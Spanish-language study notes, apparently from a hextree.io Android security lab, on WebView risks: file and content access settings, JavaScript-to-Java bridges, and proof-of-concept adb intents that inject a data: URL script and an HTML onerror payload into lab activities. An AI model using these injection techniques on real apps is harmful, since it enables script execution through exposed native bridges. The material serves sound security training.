---
title: Webviewers
sidebar_position: 1
---

## ¿Qué es?
Una WebView es realmente un componente UI (como un boton o un label) que se puede añadir al layout .xml de la app.

```xml
<WebView
android:id="@+id/big_webview"
android:layout_width="match_parent"
android:layout_height="match_parent">
</WebView>
```

De igual forma se puede referenciar en el codigo Java para cargar un sitio:

```java
WebView webView = findViewById(R.id.big_webview);
webView.loadUrl("https://www.hextree.io");
```

Es posible hacer remote debbuging de las webviews utilizando chrome en la url: chrome://inspect/#devices (la mayoria de apps en prod tienen esta funcion desactivada)

Cuando se tiene una aplicación que conste de una webview o en su mayoria sean webviews (Por ejemplo Cordova), lo mas  probable es que el codigo fuente de la aplicacion este dentro de:

```java
/Resources/assets/www
```

Es posible llevar a cabo la carga de assets de forma local, esto se vuelve relevante cuando se quiere usar la app sin conexión a internet o cuando la app enteramente es una webview, esto se puede hacer de la siguiente forma:

```java
WebView webView = findViewById(R.id.webView);
webView.getSettings().setJavaScriptEnabled(true); // Enable JavaScript if needed
webView.loadUrl("file:///android_asset/index.html");
```

Por defecto, no es posible llevar a cabo una carga de ficheros arbitraria (Unicamente los archibos de la app, debido a que estos estan embebidos dentro del apk), pero esto se puede activar con la siguiente configuración:

```java
webView.getSettings().setAllowFileAccess(true);
```

Esta configuración no es rara, esto debido a que muchas veces los devs prefieren guardar el html de forma externa, asi si quieren cambiar algo de la app, solo usan codigo custom y no tienen que enviar una update de todo el apk por la playstore

De igual forma, se tiene la opcion de abrir un contentprovider(Por defecto en true)

```java
webView.getSettings().setAllowContentAccess(true);

```

Asi como el setAllowFileAccessFromFileURLs y setAllowUniversalAccessFromFileURLs:

```java
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

## @JavascriptInterface

En las WebViews es posible crear un puente entre Javascript y Java. Haciendo que puedan llamar sus metodos de forma cruzada.

Para exponer la funcionalidad nativa a WebView, el dev tiene que crear una clase con métodos con `@JavascriptInterface`.

```java
class MyNativeBridge {
    @JavascriptInterface
    public void init(String msg) {
        // [...]
    }
    @JavascriptInterface
    public String getData() {
        // [...]
        return db.getData();
    }
}

```

Por ejemplo, este objeto se puede exponer a WebView llamando a `addJavascriptInterface()`)

```java
WebView webView = findViewById(R.id.main_webview);
webView.addJavascriptInterface(new MyNativeBridge(), "app");
webView.loadUrl(url);

```

En el lado del sitio web, este objeto estará disponible en el objeto Window global con el nombre dado en la llamada a `addJavascriptInterface(object, name)`.

```html
<script>
window.app.init("Hello");
</script>
```

Poc en ADB para enviar un intent con un extra string url:

```java
adb shell am start -n io.hextree.attacksurface/.webviews.Flag38WebViewsActivity --es URL "https://cabr4.github.io/test.html"
```

De igual forma, es posible sustituir la url por un data:// de esta forma no se tienen que estar subiendo htmls nuevos cada que se quiere hacer una PoC

```java
data:text/html,<script>window.hextree.success(true)</script>
```

Se buguea un poco el cli, por lo cual hay que urlencodearlo.

Quedando:

```java
adb shell am start -n io.hextree.attacksurface/.webviews.Flag38WebViewsActivity --es URL "data:text/html,%3Cscript%3Ewindow.hextree.success%28true%29%3C%2Fscript%3E"
```

De igual forma es posible usar la pagina:  https://oak.hackstree.io/android/webview/pwn.html

## HTML Injection / XSS en WebViews

En el caso de las aplicaciones mobile, no siempre es necesario que el XSS venga desde el servidor, ya que es posible enviar payloads desde un intent. 

HTML del apk

```html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Flag39 WebView Demo</title>
</head>
<body>
<h1>Flag39 WebView Demo</h1>
<div id="hello_name">loading...</div>
<script>
function initApp(obj) {
    console.log(JSON.stringify(obj));
    window.hello_name.innerHTML = `Hello <b>${obj.name}</b>`;
}
</script>
</body>
</html>
```

Codigo JAVA:

```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_web_view);
        final JSONObject jSONObject = new JSONObject();
        String stringExtra = getIntent().getStringExtra("NAME");
        ((TextView) findViewById(R.id.txt_webview_header)).setText(getClass().getSimpleName());
        ((TextView) findViewById(R.id.txt_webview_subtitle)).setText("file:///android_asset/flag39.html");
        final WebView webView = (WebView) findViewById(R.id.main_webview);
        webView.setWebViewClient(new WebViewClient() { // from class: io.hextree.attacksurface.webviews.Flag39WebViewsActivity.1
            @Override // android.webkit.WebViewClient
            public void onPageFinished(WebView webView2, String str) {
                super.onPageFinished(webView2, str);
                Log.i("Flag39", "init");
                webView.evaluateJavascript("initApp(" + jSONObject.toString() + ")", null);
            }
        });
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new JsObject(), "hextree");
        webView.loadUrl("file:///android_asset/flag39.html");
        if (stringExtra == null) {
            stringExtra = "Neo";
        }
```

Como se puede observar, si bien no es posible cambiar la url que carga el sitio, si es posible enviar un intent con una extra string llamada “NAME”, dicha string se va a concatenar en codigo JS. Sin embargo, JSONObject.toString es seguro y no permite concatenar Javascript, pero no elimina tags html, por lo que podemos inyectar directamente tags:

```vhdl
adb shell am start -n io.hextree.attacksurface/.webviews.Flag39WebViewsActivity --es NAME "\<img\ src=1\ onerror=hextree.success\(\)\>"
```

Webviews Vs. CustomTabs

| Webviews | CustomTabs |
| --- | --- |
| Se embebe el sitio web directamente en la app | El sitio web es abrierto por el navegador default del usuario |
| Expone llamadas nativas de JavaScript |  |